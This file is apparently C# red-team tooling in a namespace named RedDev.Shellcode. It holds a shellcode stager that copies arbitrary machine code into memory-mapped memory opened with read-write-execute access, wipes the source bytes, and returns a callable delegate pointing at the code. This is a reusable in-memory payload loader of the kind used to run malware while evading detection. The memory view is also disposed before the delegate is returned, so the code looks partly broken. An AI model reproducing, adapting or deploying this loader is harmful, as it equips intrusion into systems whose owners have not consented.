using System;
using System.IO.MemoryMappedFiles;
using System.Runtime.InteropServices;


/*
 * Based off At0ms example .Net 4.0
 */

namespace RedDev.Shellcode
{
    public class SharpStager
    {

        public static object StageShellcode<TDelegate>(byte[] shellcode)
        {
            // # Unfortunetly we're not allowed to change memory permission after creating, looking into possible ways
            using (MemoryMappedFile mmf = MemoryMappedFile.CreateNew(null, shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute))
            {
                // # Both MemoryMappedViewViewAccessor & MemoryMappedViewStream give us access needed
                using (MemoryMappedViewAccessor mmva = mmf.CreateViewAccessor(0, shellcode.Length, MemoryMappedFileAccess.ReadWriteExecute))
                {
                    unsafe
                    {
                        fixed (byte* pShellcode = shellcode)
                        {
                            byte* pFunc = null;

                            // # Need to use AcquirePoiner to get a valid pointer to the memory mapped, unsafe handle returns incorrectly.
                            mmva.SafeMemoryMappedViewHandle.AcquirePointer(ref pFunc);

                            if (pFunc == null) return null;

                            // # Copy over shellcode to memory mapped file & zero original array.
                            CopyMemory(pFunc, pShellcode, shellcode.Length);

                            ZeroMemory(pShellcode, shellcode.Length);

                            // # Convert unmanaged function pointer to managed callable function pointer.
                            // # No public access further into GetDelegateForFunctionPointer without having to entirely recreate it.
                            // # Can't direct cast (void*|byte*) of function to delegate in 4.0
                            return (TDelegate)(object)Marshal.GetDelegateForFunctionPointer((IntPtr)pFunc, typeof(TDelegate));

                        }
                    }

                }
            }
        }
  
        public unsafe static void CopyMemory(byte* dest, byte* src, int size)
        {
            for (int i = 0; i < size; i++)
            {
                dest[i] = src[i];
            }
        }

        public unsafe static void ZeroMemory(byte* dest, int size)
        {
            for (int i = 0; i < size; i++)
            {
                dest[i] = 0;
            }
        }
    }
}
